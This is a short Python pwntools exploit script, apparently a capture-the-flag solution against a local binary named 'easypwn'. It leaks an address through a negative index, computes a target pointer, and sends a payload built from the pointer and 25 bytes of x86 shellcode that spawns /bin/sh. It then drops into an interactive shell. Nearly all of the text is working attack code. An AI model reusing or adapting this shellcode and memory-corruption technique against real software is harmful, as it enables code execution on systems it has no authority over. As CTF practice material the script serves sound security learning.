from pwn import *
context.terminal=['tmux', 'splitw', '-h']

p = process('./easypwn')

#25byte
shell = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80'

p.sendlineafter(b"exit\n",b'4')
p.sendlineafter(b"know\n",b'-4')
p.recvuntil(b'= ')
base = p.recvline()[:-1] 
print(base)

feedback = (-(int(base)-0x70) ^ 0xffffffff) + 1
print(hex(feedback))

p.sendlineafter(b'exit\n',b'5')

payload = p32(feedback+4)
payload += shell.ljust(0x64,b'a')
payload += p32(feedback+4)

p.sendlineafter(b'have\n',payload)
p.interactive()